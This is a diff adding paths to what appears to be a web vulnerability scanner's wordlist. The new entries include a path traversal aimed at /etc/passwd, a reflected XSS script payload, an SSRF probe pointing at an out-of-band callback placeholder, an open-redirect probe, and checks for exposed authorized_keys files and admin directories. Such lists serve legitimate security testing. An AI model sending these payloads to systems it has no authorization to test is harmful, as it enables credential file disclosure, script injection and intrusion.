@@ -1405,3 +1405,14 @@
 /wp-json/wp/v2/users
 /wp-json/wp/v2/users?foo=simple-jwt-login
 /?aiowpsec_do_log_out=1&al_additional_data=1
+/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
+/?BazaR&vue=formulaire&action=confirm_delete&idformulaire=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/_image?href=//{{interactsh-url}}/600x400
+/wp-json/tribe/events/v1/organizers
+/wp-json/tribe/events/v1/venues
+/ThisCanBeAnything?os_destination=%2F%2Foast.pro
+/authorized_keys
+/.authorized_keys
+/App_Data/
+/App_Plugins/
+/munin/
